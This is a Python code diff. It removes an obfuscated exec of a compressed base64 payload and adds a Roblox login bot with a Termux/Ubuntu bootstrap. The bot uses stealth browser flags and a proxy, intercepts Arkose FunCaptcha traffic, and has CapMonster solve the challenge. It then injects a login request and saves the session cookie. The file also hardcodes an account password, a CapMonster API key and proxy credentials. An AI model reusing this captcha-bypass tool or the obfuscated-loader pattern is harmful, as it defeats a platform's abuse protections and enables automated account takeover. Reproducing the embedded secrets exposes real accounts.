@@ -1,2 +1,249 @@
-import zlib,base64
-exec(zlib.decompress(base64.b64decode(b"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")).decode("utf-8"))
+import os
+import sys
+
+# ==========================================
+# 🧠 SISTEMA DE AUTO-INSTALAÇÃO (BOOTSTRAP)
+# ==========================================
+if "--ubuntu-run" not in sys.argv and "com.termux" in sys.executable:
+    print("🚀 [SISTEMA] Rodando no Termux! Verificando ambiente e pulando pro Ubuntu...")
+    os.system("command -v proot-distro > /dev/null 2>&1 || (pkg update -y && pkg install proot-distro -y)")
+    os.system("proot-distro install ubuntu > /dev/null 2>&1")
+
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    nome_script = os.path.basename(__file__)
+
+    sh_temp = os.path.join(script_dir, ".run_ubuntu_temp.sh")
+    comando_ubuntu = f"""#!/bin/bash
+export DEBIAN_FRONTEND=noninteractive
+if ! command -v python3 > /dev/null 2>&1; then
+    apt-get update -y && apt-get install python3 python3-pip -y;
+fi
+if ! python3 -c 'import patchright' > /dev/null 2>&1; then
+    pip3 install patchright requests --break-system-packages && python3 -m patchright install chromium;
+fi
+cd /app
+python3 {nome_script} --ubuntu-run
+"""
+    with open(sh_temp, "w") as f:
+        f.write(comando_ubuntu)
+    os.system(f"chmod +x {sh_temp}")
+    os.system(f"proot-distro login ubuntu --bind '{script_dir}:/app' -- bash /app/.run_ubuntu_temp.sh")
+
+    if os.path.exists(sh_temp):
+        os.remove(sh_temp)
+    sys.exit()
+
+# ==========================================
+# 🤖 IMPORTS DO BOT (SÓ RODAM DENTRO DO UBUNTU)
+# ==========================================
+import time, json, requests, re, base64
+from urllib.parse import unquote
+from patchright.sync_api import sync_playwright
+
+USER = "Alaquelegalz4"
+PASS = "willianz4z4oof$"
+COOKIE_FILE = "cookies.json"
+CM_KEY = "35e32346fa20ab9dfa29b14e7809de2d"
+ALVO_URL = "https://www.roblox.com/login"
+
+USAR_PROXY = True 
+
+PROXY_HOST = "gw.dataimpulse.com"
+PROXY_PORT = 823
+PROXY_USER = "66f8168c3d63dc0d5abd"
+PROXY_PASS = "22a2f596131de837"
+USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
+
+dados_capturados = {
+    "blob": None,
+    "pk": None,
+    "surl": None,
+    "challenge_id": None
+}
+
+def interceptador_rede(route):
+    request = route.request
+    if "fc/gt2/public_key/" in request.url and request.method == "POST":
+        print(f"\n[🚨 ALARME DE REDE] Requisição Arkose interceptada!")
+        try:
+            partes_url = request.url.split('/')
+            dados_capturados['pk'] = partes_url[-1]
+            match_surl = re.search(r'https?://([^/]+)', request.url)
+            if match_surl:
+                dados_capturados['surl'] = match_surl.group(1)
+
+            payload_bruto = request.post_data
+            if payload_bruto:
+                match_blob = re.search(r'(?:data(?:%5B|\[)blob(?:%5D|\])|blob)=([^&]+)', payload_bruto)
+                if match_blob:
+                    blob_limpo = unquote(match_blob.group(1)).replace(' ', '+')
+                    dados_capturados['blob'] = blob_limpo
+                    print(f"[🔥 BINGO] Blob extraído! Tamanho: {len(blob_limpo)}")
+        except Exception as e:
+            print(f"[-] Erro no interceptador: {e}")
+        route.abort()
+    else:
+        route.continue_()
+
+def captura_challenge(response):
+    if "v2/login" in response.url and response.status == 403:
+        chal_id = response.headers.get("rblx-challenge-id")
+        if chal_id:
+            dados_capturados['challenge_id'] = chal_id
+            print(f"\n[🔥] Challenge ID capturado: {chal_id}")
+
+def solve(blob, pk, surl):
+    print(f"[*] Montando Payload pro CapMonster...")
+    task_data = {
+        'type': 'FunCaptchaTaskProxyless' if not USAR_PROXY else 'FunCaptchaTask',
+        'websiteURL': ALVO_URL,
+        'websitePublicKey': pk,
+        'userAgent': USER_AGENT
+    }
+
+    if USAR_PROXY:
+        task_data.update({
+            'proxyType': 'http', 'proxyAddress': PROXY_HOST,
+            'proxyPort': PROXY_PORT, 'proxyLogin': PROXY_USER, 'proxyPassword': PROXY_PASS,
+        })
+
+    if surl: task_data['funcaptchaApiJSSubdomain'] = surl
+    if blob: task_data['data'] = json.dumps({'blob': blob})
+
+    try:
+        t_res = requests.post('https://api.capmonster.cloud/createTask', json={'clientKey': CM_KEY, 'task': task_data}, timeout=20).json()
+    except Exception:
+        return None
+
+    t = t_res.get('taskId')
+    if not t: return None
+    print(f"[*] Task ID: {t}. Aguardando resolução...")
+
+    tentativas = 1
+    while tentativas <= 80:
+        time.sleep(3)
+        try:
+            res = requests.post('https://api.capmonster.cloud/getTaskResult', json={'clientKey': CM_KEY, 'taskId': t}, timeout=20).json()
+        except: continue
+
+        if res.get('errorId', 0) > 0: return None
+        status = res.get('status')
+        print(f"[*] [Tempo: {tentativas * 3}s] Status: {status}")
+
+        if status == 'ready':
+            print("\n✅ [+] CAPTCHA RESOLVIDO!")
+            return res.get('solution', {}).get('token')
+        tentativas += 1
+    return None
+
+with sync_playwright() as p:
+    args_stealth = ['--disable-blink-features=AutomationControlled', '--no-sandbox', '--disable-setuid-sandbox', '--window-size=1280,720', '--disable-web-security']
+    print("\n[+] Iniciando Navegador...")
+    
+    b = p.chromium.launch(headless=True, args=args_stealth, proxy={'server': f'http://{PROXY_HOST}:{PROXY_PORT}', 'username': PROXY_USER, 'password': PROXY_PASS})
+    c = b.new_context(user_agent=USER_AGENT, viewport={'width': 1280, 'height': 720})
+    page = c.new_page()
+    
+    page.route("**/*", interceptador_rede)
+    page.on("response", captura_challenge)
+
+    MAX_RETRIES = 5
+    for tentativa_atual in range(1, MAX_RETRIES + 1):
+        dados_capturados['blob'] = None
+        dados_capturados['pk'] = None
+        dados_capturados['challenge_id'] = None
+
+        print(f"\n==============================================")
+        print(f"🚀 [RODADA {tentativa_atual}/{MAX_RETRIES}] Tentando autenticação...")
+        print(f"==============================================")
+
+        try:
+            page.goto(ALVO_URL, wait_until="domcontentloaded", timeout=60000)
+            page.fill('input#login-username', USER)
+            time.sleep(1)
+            page.fill('input#login-password', PASS)
+            time.sleep(1)
+
+            page.click('button#login-button', delay=200, force=True)
+
+            for _ in range(40):
+                page.wait_for_timeout(1000)
+                if dados_capturados['blob'] and dados_capturados['challenge_id']:
+                    break
+
+            if dados_capturados['blob'] and dados_capturados['pk'] and dados_capturados['challenge_id']:
+                token = solve(dados_capturados['blob'], dados_capturados['pk'], dados_capturados['surl'])
+
+                if token:
+                    print("\n[+] Enviando resposta do desafio para a API...")
+                    
+                    # Formata os metadados do desafio em Base64
+                    metadata_raw = json.dumps({
+                        "unifiedCaptchaId": dados_capturados['challenge_id'],
+                        "captchaToken": token,
+                        "actionType": "Generic"
+                    })
+                    metadata_b64 = base64.b64encode(metadata_raw.encode()).decode()
+
+                    ataque_api_js = f"""
+                    (async () => {{
+                        let payload = {{
+                            ctype: "Username",
+                            cvalue: "{USER}",
+                            password: "{PASS}"
+                        }};
+                        
+                        let csrf = document.querySelector('meta[name="csrf-token"]')?.content || '';
+                        
+                        let headers = {{
+                            "Content-Type": "application/json",
+                            "X-CSRF-TOKEN": csrf,
+                            "rblx-challenge-id": "{dados_capturados['challenge_id']}",
+                            "rblx-challenge-type": "captcha",
+                            "rblx-challenge-metadata": "{metadata_b64}"
+                        }};
+                        
+                        let res = await fetch("https://auth.roblox.com/v2/login", {{
+                            method: "POST",
+                            headers: headers,
+                            body: JSON.stringify(payload),
+                            credentials: "include"
+                        }});
+                        
+                        if (res.status === 403 && res.headers.has('x-csrf-token')) {{
+                            headers["X-CSRF-TOKEN"] = res.headers.get('x-csrf-token');
+                            res = await fetch("https://auth.roblox.com/v2/login", {{
+                                method: "POST",
+                                headers: headers,
+                                body: JSON.stringify(payload),
+                                credentials: "include"
+                            }});
+                        }}
+                        
+                        return await res.json();
+                    }})()
+                    """
+                    
+                    resposta_api = page.evaluate(ataque_api_js)
+                    print(f"\n[📡] RESPOSTA DO SERVIDOR: {resposta_api}")
+                    
+                    time.sleep(3)
+                    cookies = c.cookies()
+                    cookies_str = json.dumps(cookies)
+
+                    if ".ROBLOSECURITY" in cookies_str or "twoStepVerificationData" in json.dumps(resposta_api) or "user" in resposta_api:
+                        with open(COOKIE_FILE, 'w') as f:
+                            json.dump(cookies, f)
+                        print(f"\n✅ [SUCESSO] Sessão autenticada! Cookie salvo em: {COOKIE_FILE}")
+                        b.close()
+                        sys.exit(0)
+                    else:
+                        print("\n[-] Falha ao autenticar com o token fornecido.")
+
+        except Exception as e:
+            print(f"[-] Erro na execução: {e}")
+        
+        time.sleep(3)
+
+    b.close()
+    print("\n[+] Script Finalizado.")
